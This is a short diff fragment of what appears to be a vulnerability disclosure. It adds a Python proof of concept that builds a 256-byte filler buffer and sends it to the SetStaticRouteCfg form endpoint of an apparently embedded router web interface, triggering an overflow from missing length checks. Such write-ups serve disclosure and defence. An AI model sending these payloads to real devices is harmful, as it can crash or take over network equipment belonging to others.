@@ -28,6 +28,10 @@ Because there are no length checks on the input data, an attacker can supply an 
 ### Reproduce
 
 ```python
+import requests
+
+cyclic = 0x100 * b'A'
+
 def exploit_fromSetRouteStatic():
     url = f"http://{host}/goform/SetStaticRouteCfg"
     payload = cyclic + b",a,b,WAN1"
